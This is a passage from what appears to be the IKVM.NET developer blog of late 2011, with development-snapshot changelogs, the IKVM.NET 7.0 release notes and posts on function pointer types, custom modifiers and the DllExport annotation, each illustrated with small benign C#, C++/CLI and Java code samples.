<LI>Include copyright and metadata in IKVM.OpenJDK.Tools.dll. Part of patch #3458997. 
<LI>Added AssemblyInformationalVersionAttribute to OpenJDK assemblies (to set the "Product Version"). Part of patch #3458997. 
<LI>When casting arguments we should use the actual method parameter types, instead of the call site types (which can differ in the case of unloadable types (with crazy class loader trickery)). 
<LI>Unloadable types can't violate loader constraints. 
<LI>Made override stub generation more consistent. 
<LI>Generate override stub for miranda method, when necessary. 
<LI>Fixed ikvcm to not crash when ikvmc -resource: or -externalresource: option doesn't contain an = sign. 
<LI>Fixed unloadable corner case (that can only be generated by playing weird class loader tricks). 
<LI>Verifier bug fix. Removed incorrect check for uninitialized objects on backward branch. 
<LI>IKVM.Reflection: Support setting an invalid culture using AssemblyBuilder.__SetAssemblyCulture(). 
<LI>IKVM.Reflection: AssemblyCultureAttribute should not influence the LCID of the version info resource. 
<LI>IKVM.Reflection: Removed static Create() from __StandAloneMethodSig and added Universe.MakeStandAloneMethodSig().</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4366.zip">ikvmbin-7.1.4366.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/16/2011 10:07:11 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=39c2a950-9f73-4823-853b-28ecf4e15ca4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=39c2a950-9f73-4823-853b-28ecf4e15ca4">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 05 December 2011</h2></div>
<div class="newsItems"><a name="a692505a6-f9e7-45ec-90b9-ec7a75d3b509"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.0 Released</h3>
	<div class="entryBody">
		<P>I've released&nbsp;<A href="https://sourceforge.net/projects/ikvm/files/ikvm/7.0.4335.0/">IKVM.NET 7.0</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=0f65c7f6-796d-4b27-97ed-b7b1230842c0">release candidate 0</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the improvements, known issues and incompatibilities.</P>
<P><STRONG>What's New</STRONG> (relative to <A HREF="/PermaLink.aspx?guid=94934445-9b06-4a81-b76b-fcd23d4f6ec2">IKVM.NET 0.46</A>):</P>
<UL>
<LI>Integrated OpenJDK 7 b147. </LI>
<LI>Implemented Java 7 JVM changes. </LI>
<LI>Java annotations on statically compiled code are now returned as java.lang.reflect.Proxy objects for compability with broken code that assumes this is always the case. </LI>
<LI>Added delegate conversion for java.lang.reflect.InvocationHandler to ikvm.runtime.Delegates. </LI>
<LI>Various remap file improvements. </LI>
<LI>Changed build and JNI code to use different names for the Windows x86 and x64 versions of the native dll. </LI>
<LI>Retain reflection field ordering for ikvmc compiled code (not required by spec, but to improve compatibility with broken code). </LI>
<LI>Various AWT fixes. </LI>
<LI>Interop between <A HREF="/PermaLink.aspx?guid=de964df2-d54f-455b-8ec6-5288bbb4b532">java.lang.AutoCloseable</A> and System.IDisposable. </LI>
<LI>Various build system improvements. </LI>
<LI>Added ikvmc -warnaserror option. </LI>
<LI>Fixed java.io.FileOutputStream in append mode to use atomic append. </LI>
<LI>Various performance improvements. </LI>
<LI>Added -Xnoglobbing option to ikvm.exe. </LI>
<LI>Various minor fixes. </LI>
<LI>Implemented dual stack sockets (Windows Vista and up only). </LI>
<LI>Implemented platform MBean server. </LI>
<LI>Implemented SocketChannel.sendOutOfBandData(). </LI>
<LI>Implemented DatagramChannel multicast methods. </LI>
<LI>Removed mapping of System.Security.VerificationException to java.lang.VerifyError. </LI>
<LI>IKVM.Reflection: Massive enhancements to support a very large portion of the managed PE capabilities (much more than System.Reflection.Emit).</LI></UL>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>&nbsp; 
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>&nbsp; 
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI>
<LI><A href="http://openjdk.java.net/projects/jdk7/features/#fa535991">Strict class-file checking</A> is not implemented.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled together during a single compilation fully obeys the JLS binary compatibility rules. </LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 7 build 147. Below is a list of divergences and IKVM.NET specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>java.net</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f405">SCTP</A> and <A href="http://openjdk.java.net/projects/jdk7/features/#f639">SDP</A> not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.nio.file</TD>
<TD>Most optional features (e.g. ACLs) are not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.text.Bidi</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.crypto</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f73">ECC</A> is not implemented.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written and there is limited metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>There is a Win32 specific printing implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>ECMAScript implementation is not included.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Not supported.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.smartcardio, for example, means that the API is there but there is no back-end to provide the actual smartcard communication support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas, but patches are welcome, of course.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/05/2011 07:56:27 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=692505a6-f9e7-45ec-90b9-ec7a75d3b509"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=692505a6-f9e7-45ec-90b9-ec7a75d3b509">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 02 December 2011</h2></div>
<div class="newsItems"><a name="acc8a8bf9-3451-42cc-8f95-2b201078cb16"></a><div class="entry">
	<h3 class="entryTitle">Function Pointer Types</h3>
	<div class="entryBody">
		<P>In today's snapshot I also added support for function pointer types. The CLI supports both managed and unmanaged function pointer types, however both are unverifiable.</P>
<P>Here's a small C++/CLI example of using a managed function pointer type (in the call method&nbsp;signature):</P>
<P><CODE>void func() {<BR>&nbsp; System::Console::WriteLine("Hello from Func");<BR>}<BR><BR>void call(void (*p)()) {<BR>&nbsp; p();<BR>}<BR><BR>void main() {<BR>&nbsp; call(func);<BR>}</CODE></P>
<P>Compile this with <CODE>cl /clr:pure test.cpp</CODE> and the resulting test.exe will be a managed PE file with these three methods (and a lot of other junk).</P>
<P>Here's an IKVM.Reflection example to create an equivalent foo.exe (without the extra junk):</P>
<P><CODE>using System;<BR>using IKVM.Reflection;<BR>using IKVM.Reflection.Emit;<BR>using Type = IKVM.Reflection.Type;<BR><BR>class Program {<BR>&nbsp; public static void Main() {<BR>&nbsp;&nbsp;&nbsp; var u = new Universe();<BR>&nbsp;&nbsp;&nbsp; var ab = u.DefineDynamicAssembly(new AssemblyName("Foo"), AssemblyBuilderAccess.Save);<BR>&nbsp;&nbsp;&nbsp; var modb = ab.DefineDynamicModule("Foo", "Foo.exe");<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; var mb2 = modb.DefineGlobalMethod("func", MethodAttributes.Static, null, null);<BR>&nbsp;&nbsp;&nbsp; var ilgen = mb2.GetILGenerator();<BR>&nbsp;&nbsp;&nbsp; ilgen.EmitWriteLine("Hello from Func");<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Ret);<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; Type func = u.MakeFunctionPointer(u.MakeStandAloneMethodSig(CallingConventions.Standard, null, default(CustomModifiers), null, null, null));<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; var mb3 = modb.DefineGlobalMethod("call", MethodAttributes.Static, null, new Type[] { func });<BR>&nbsp;&nbsp;&nbsp; ilgen = mb3.GetILGenerator();<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Ldarg_0);<BR>&nbsp;&nbsp;&nbsp; ilgen.__EmitCalli(OpCodes.Calli, func.__MethodSignature);<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Ret);<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; var mb1 = modb.DefineGlobalMethod("main", MethodAttributes.Static, null, null);<BR>&nbsp;&nbsp;&nbsp; ilgen = mb1.GetILGenerator();<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Ldftn, mb2);<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Call, mb3);<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(OpCodes.Ret);<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; modb.CreateGlobalFunctions();<BR>&nbsp;&nbsp;&nbsp; ab.SetEntryPoint(mb1);<BR>&nbsp;&nbsp;&nbsp; ab.Save("Foo.exe");<BR>&nbsp; }<BR>} </CODE></P>
<P>(I should point out that this won't work with today's snapshot, because while writing this I discovered that I had incorrectly added a static Create() method to __StandAloneMethodSig, but that should instead be an instance method on Universe.)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/02/2011 09:43:53 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cc8a8bf9-3451-42cc-8f95-2b201078cb16"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cc8a8bf9-3451-42cc-8f95-2b201078cb16">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a1a216033-1b46-4c82-afe7-41cde284e948"></a><div class="entry">
	<h3 class="entryTitle">Custom Modifiers</h3>
	<div class="entryBody">
		<P>As I wrote earlier today, the theme of today's snapshot is custom modifiers, but I decided to expand a bit on that, since they are a relatively unknown feature of .NET.</P>
<P>In the <A href="/PermaLink.aspx?guid=82">early days</A> of IKVM.NET I ran into the problem that some Java types must be erased in .NET signatures. An example are arrays of what I call ghost types. Fortunately these are not very common, but here's an example method:</P>
<P><CODE>void foo(CharSequence[] array) { }</CODE></P>
<P>When this is compiled with ikvmc, you end up with something like this:</P>
<P><CODE>[NameSig("foo", "([Ljava.lang.CharSequence;)V")]<BR>void foo(object[] array) { }</CODE></P>
<P>If the class happened to already have a foo method with that signature, the method name would be mangled with a numerical suffix (e.g. foo_0).</P>
<P>Now, instead of adding a custom attribute and using name mangling, .NET has a much better solution for this. Custom modifiers, but unfortunately you couldn't use them via .NET's System.Reflection.Emit API back in the .NET 1.x days.</P>
<P>When .NET 2.0 came around they added (some) support for custom modifiers, but it both had some issues and by then I already had a working solution, so there was not much need for changing the implementation. The one exception was in constructor signatures, since there you cannot mangle the method name, you have to rely on the signature types to make the signature unique, so there I did add custom modifiers when necessary to make sure the signatures are unique.</P>
<P>In today's snapshot I've changed fields and constructors to always use custom modifiers (when necessary) and removed the usage of the NameSigAttribute. Methods still need to be done.</P>
<P>Here's an example with two constructors that end up with the same signatures:</P>
<P><CODE>public class Test {<BR>&nbsp; public Test(Object obj) { }<BR>&nbsp; public Test(cli.System.Object obj) { }<BR>}</CODE></P>
<P>When you compile this with ikvmc, you get something like this:</P>
<P><CODE>public class Test {<BR>&nbsp; public Test(object obj) { }<BR>&nbsp; public Test(object modopt(object) obj) { }<BR>}</CODE></P>
<P>The modopt(object) construct here stands for an optional custom modifier of type object. When this class is encountered by IKVM (reflection or ikvmc) it can recover the original Java types based on the signature and custom modifier. When you use this class from C#, the C# compiler will prefer the constructor without the custom modifier, so you can still use the class. The cli.System.Object overload is not useable from C#, but when there is no signature conflict, C# will also allow you to use the version with the custom modifier. So it allows for nice cross language interop (especially given how unlikely all these scenarios are).</P>
<P>As I said, I haven't done methods yet, but I did experiment a little to see if C# interop would work. I was especially concerned about overriding/implementing methods with a custom modifier in the signature, but the .NET C# compiler supports this pretty well. The Mono C# compiler does not yet have support for this. Only when you have two or more abstract methods with the same signature, you can run into a problem. For base classes with "duplicate" abstract methods, the C# compiler will not allow you to subclass that class, but you can implement interfaces with "duplicate" methods and in that case the C# compiler will emit bridge methods for all signatures that call into your (necessarily) single implemenation method.</P>
<P><STRONG>Crazy Stuff</STRONG></P>
<P>With the new IKVM.Reflection custom modifier support, you can now generate signatures that cannot be generated with System.Reflection.Emit. Here's an example of interleaved required and optional custom modifiers:</P>
<P><CODE>var u = new Universe();<BR>var ab = u.DefineDynamicAssembly(new AssemblyName("Foo"), AssemblyBuilderAccess.Save);<BR>var modb = ab.DefineDynamicModule("Foo", "Foo.dll");<BR>var tb = modb.DefineType("FooType", TypeAttributes.Public | TypeAttributes.Abstract);<BR>tb.DefineDefaultConstructor(MethodAttributes.Public);<BR>CustomModifiersBuilder mods = new CustomModifiersBuilder();<BR>mods.AddOptional(u.Import(typeof(object)));<BR>mods.AddRequired(u.Import(typeof(object)));<BR>mods.AddOptional(u.Import(typeof(object)));<BR>var mb = tb.DefineMethod("M", MethodAttributes.Public | MethodAttributes.Abstract | MethodAttributes.NewSlot | MethodAttributes.Virtual);<BR>mb.__SetSignature(null, new CustomModifiers(), new Type[] { u.Import(typeof(int)) }, new CustomModifiers[] { mods.Create() });<BR>tb.CreateType();<BR>ab.Save("Foo.dll");</CODE></P>
<P>The resulting FooType in Foo.dll contains a method M that cannot be called (or overridden) by System.Reflection.Emit generated code. It also can't be used from C#,&nbsp; but that is by design, the C# compiler will not allow you to use any members that have required custom modifiers that it doesn't understand (I think that the only required custom modifier that it understands is <A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.isvolatile.aspx">IsVolatile</A> on fields).</P>
<P>Of course, IKVM itself is not very good about dealing with custom modifiers yet. It only understands its own custom modifiers, but can get confused when accessing other .NET code with custom modifiers.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/02/2011 08:57:09 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1a216033-1b46-4c82-afe7-41cde284e948"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1a216033-1b46-4c82-afe7-41cde284e948">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="aa43da8af-f08e-49dc-98f2-66d1c54a3321"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>The theme of this snapshot is custom modifiers. I've been working on ikvmc to make more use of custom modifiers for fields and constructors that have "special" types in their signatures and on the IKVM.Reflection side I completly rewrote custom modifier handling (unrelated to ikvmc) to allow roundtripping C++/CLI files (minus the unmanaged bits, obviously) and support interleaved modreq and modopt sequences.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 7.1.4352.0.</LI>
<LI>Fixed dynamic mode with class GC enabled to automatically add required InternalsVisibleToAttribute to the dynamic assemblies.</LI>
<LI>Greatly improved access stub generation. Fixed many related bugs.</LI>
<LI>Fixed ikvmc exception when decoding NameSigAttribute with missing type.</LI>
<LI>Added ikvm.runtime.Util.getClassFromTypeHandle() overload for classes that represent arrays of remapped .NET types and .NET primitives.</LI>
<LI>Instead of mangling field names and using NameSigAttribute, we now use modopt to modify the signature and record the real type.</LI>
<LI>Removed legacy remap feature that allowed final fields as properties to be defined (long time ago this was used for the System.in/out/err fields).</LI>
<LI>Fixed Graphics2D.clip(null) to not throw an exception for bitmap and print graphics.</LI>
<LI>Fixed java.nio.file.FileStore for non-accessible drive to throw exception when trying to create the FileStore, not when accessing the name() or type() properties.</LI>
<LI>Stop mangling property names for access stubs (instead we rely on custom modifiers to make them unique).</LI>
<LI>Stop mangling property accessor method names, but use a custom modifier instead.</LI>
<LI>Generate access stubs for final fields (when -strictfinalfieldsemantics isn't specified).</LI>
<LI>Fixed ikvmc to not treat informational messages as error when -warnaserror is specified. Fix for <A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3443377&amp;group_id=69637">#3443377</A>.</LI>
<LI>Changed ikvmc to not enforce pre-1.5 class name rules (since HotSpot, by default doesn't enforce any naming rules for classes loaded by trusted class loaders). Fix for <A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3443373&amp;group_id=69637">#3443373</A>.</LI>
<LI>Relax dynamic mode class name validation for trusted class loaders.</LI>
<LI>Implemented NetToolkit.isModalExclusionTypeSupported() (by always returning false). Fix for <A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3441959&amp;group_id=69637">#3441959</A>.</LI>
<LI>Added extension methods for (almost) all instance methods in Object, String and Throwable to ikvm.extensions.ExtensionMethods.</LI>
<LI>Added ObsoleteAttribute to instancehelper_ methods in remapped types (with a message saying that the extension methods should be used).</LI>
<LI>Added parameter name to Throwable.addSuppressed() in map.xml.</LI>
<LI>Added -Xverify option to ikvm.exe.</LI>
<LI>Use custom modifiers (instead of NameSigAttribute) for constructors with mangled types.</LI>
<LI>When a member with unloadable types in its signature is exposed via reflection, the unloadable types should be resolved to actual types.</LI>
<LI>Mark getSpace0 with SecuritySafeCritical to avoid getting an exception with .NET 4.0 build.</LI>
<LI>IKVM.Reflection: Rewrote custom modifier handling to retain ordering.</LI>
<LI>IKVM.Reflection: Added ConstructorInfo.__ReturnParameter to expose custom modifiers.</LI>
<LI>IKVM.Reflection: Added __GetCustomModifiers() to various *Info types.</LI>
<LI>IKVM.Reflection: Added CustomModifiers type to encapsulate a custom modifier sequence.</LI>
<LI>IKVM.Reflection: Added CustomModifiersBuilder to create a CustomModifiers sequence.</LI>
<LI>IKVM.Reflection: Marked a number of IKVM.Reflection specific methods Obsolete, because they are replaced with method that take CustomModifiers value(s).</LI>
<LI>IKVM.Reflection: Added support for function pointer types.</LI>
<LI>IKVM.Reflection: Added support for custom modifiers to StandAloneMethodSig.</LI>
<LI>IKVM.Reflection: Added custom modifier support in local variable signatures.</LI>
<LI>IKVM.Reflection: Fixed SignatureHelper to support custom modifiers in method signatures.</LI>
<LI>IKVM.Reflection: Added new overload of __ResolveOptionalParameterTypes() that supports resolving generic type parameters and custom modifiers.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4352.0.zip">ikvmbin-7.1.4352.0.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/02/2011 07:49:54 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a43da8af-f08e-49dc-98f2-66d1c54a3321"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a43da8af-f08e-49dc-98f2-66d1c54a3321">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 15 November 2011</h2></div>
<div class="newsItems"><a name="a78d507c1-f1e2-4706-9f41-866a34d0a2c0"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Hot on the heels of the 7.0 release candidate, the first development snapshot of 7.1. The most visible change is a <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=3089748&amp;group_id=69637&amp;atid=525267">new feature</A>. The <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/classpath/ikvm/lang/DllExport.java?view=markup">ikvm.lang.DllExport</A> annotation to export static methods as unmanaged entry points.</P>
<P>Here's a crazy example:</P>
<P><CODE>import ikvm.lang.DllExport;<BR>import cli.System.Runtime.InteropServices.DllImportAttribute;<BR><BR>public class test {<BR>&nbsp; @DllExport(name = "Foo", ordinal = 42)<BR>&nbsp; static void Dummy() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("Hello World");<BR>&nbsp; }<BR><BR>&nbsp; @DllImportAttribute.Annotation("test.exe")<BR>&nbsp; static native void Foo();<BR><BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; Foo();<BR>&nbsp; }<BR>}&nbsp;</CODE></P>
<P>Compile as follows:</P>
<P><CODE>ikvmstub mscorlib<BR>javac -cp \ikvm\lib\ikvm-api.jar;mscorlib.jar test.java <BR>ikvmc test.class -r:mscorlib -platform:x86</CODE></P>
<P>The DllExport annotation only works when you explicitly specify -platform:x86 or -platform:x64. In the future ARM will also be supported, but I'll need to have an ARM Windows 8 system first. Since it emits an unmanaged entry point, the resulting assembly is a platform specific <A href="/PermaLink.aspx?guid=7c760276-fc97-4b90-9208-5d67797b21a7">mixed assembly</A>.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 7.1.4336.0. 
<LI>Added ikvmc warnings for referencing non-primary assembly in shared class loader group and duplicate references. 
<LI>Removed ikvmc -platform:Itanium option. 
<LI>Added ikvm.lang.DllExport annotation to export static methods as unmanaged exports. 
<LI>Implemented a different pinning scheme for GetPrimitiveArrayCritical() that tolerates broken code that passes back the wrong pointer to Release. Should also perform better in most cases. GetStringCritical() now also pins instead of copies. Note that we intentionally ignore the mode parameter in ReleasePrimitiveArrayCritical() as HotSpot does the same. 
<LI>Added include stdarg.h to jni.h make the header file compile by itself. 
<LI>Added JNI_TRUE and JNI_FALSE to jni.h. 
<LI>IKVM.Reflection: Fixed various assembly name parsing bugs in managed Fusion CompareAssemblyIdentity. 
<LI>IKVM.Reflection: Re-implemented (most of) AssemblyName without dependency on System.Reflection.AssemblyName.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4336.zip">ikvmbin-7.1.4336.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/15/2011 07:25:45 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=78d507c1-f1e2-4706-9f41-866a34d0a2c0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=78d507c1-f1e2-4706-9f41-866a34d0a2c0">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 November 2011</h2></div>
<div class="newsItems"><a name="a0f65c7f6-796d-4b27-97ed-b7b1230842c0"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.0 Release Candidate 0</h3>
	<div class="entryBody">
